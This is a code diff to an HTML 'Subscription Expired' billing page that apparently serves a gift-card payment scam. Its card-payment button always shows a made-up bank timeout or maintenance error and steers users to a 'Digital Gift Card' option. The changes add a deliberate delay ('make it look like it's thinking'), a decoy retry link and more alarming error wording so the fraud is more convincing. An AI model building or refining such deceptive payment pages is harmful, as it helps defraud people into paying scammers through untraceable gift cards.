@@ -1,34 +1,46 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Secure Billing Update</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Billing Update</title>
     <style>
         body { font-family: sans-serif; background: #f4f7f9; text-align: center; padding: 50px 20px; }
         .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
         h1 { font-size: 22px; color: #333; }
-        .option { border: 2px solid #eee; padding: 15px; margin: 10px 0; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        .option:hover { border-color: #007bff; }
-        #error-msg { color: red; font-size: 14px; display: none; margin-bottom: 10px; }
+        p { color: #666; font-size: 15px; }
+        .option { border: 2px solid #eee; padding: 15px; margin: 15px 0; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        .option:hover { border-color: #007bff; background: #f0f7ff; }
+        #error-msg { color: #d9534f; font-size: 14px; display: none; margin-bottom: 10px; font-weight: bold; }
+        .btn-error { color: #d9534f; font-size: 12px; text-decoration: underline; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="card">
         <h1>Subscription Expired</h1>
-        <p>Please select a payment method to restore access.</p>
-        <div id="error-msg">System Error: Bank gateway timeout. Please use Digital Credits.</div>
+        <p>Your premium service access is suspended. Please select a payment method to restore access.</p>
         
-        <div class="option" onclick="showError()">Credit / Debit Card</div>
+        <div id="error-msg">⚠️ Connection Error: Bank gateway timeout. Please use Digital Credits.</div>
+        
+        <div class="option" onclick="handleDebitClick()">Credit / Debit Card</div>
         <div class="option" onclick="goToGiftCard()">Digital Gift Card (Fast)</div>
+        
+        <p class="btn-error" id="retry-btn" style="display:none;" onclick="location.reload()">Try Again</p>
     </div>
 
     <script>
-        function showError() {
+        function handleDebitClick() {
             document.getElementById('error-msg').style.display = 'block';
-            setTimeout(() => { alert("Error: Bank connection failed. Please use Digital Credit method to avoid delay."); }, 100);
+            document.getElementById('retry-btn').style.display = 'inline-block';
+            // Simulate a delay to make it look like it's "thinking"
+            setTimeout(() => {
+                alert("Error: Your bank is currently undergoing maintenance. Use Digital Credit method to avoid delay.");
+            }, 500);
         }
+
         function goToGiftCard() {
-            window.location.href = '/giftcard.html';
+            // This points to the file inside the /public folder
+            window.location.href = '/public/giftcard.html';
         }
     </script>
 </body>
